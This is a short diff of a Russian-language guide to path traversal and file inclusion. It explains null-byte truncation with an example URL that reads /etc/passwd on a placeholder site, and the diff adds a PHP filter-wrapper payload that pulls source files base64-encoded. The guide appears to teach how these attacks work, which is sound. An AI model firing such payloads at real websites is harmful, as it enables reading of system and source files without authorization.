@@ -20,4 +20,5 @@ Windows:
 Если приложение требует, чтобы имя файла, предоставляемое пользователем, заканчивалось ожидаемым расширением файла, например `.png`, то можно использовать нулевой байт (`%00`), чтобы обрезать путь к файлу перед требуемым расширением:
 `https://insecure-website.com/loadImage?filename=../../../etc/passwd%00.png`
 
+`image.php?img=php://filter/convert.base64-encode/resource=index.php`
 
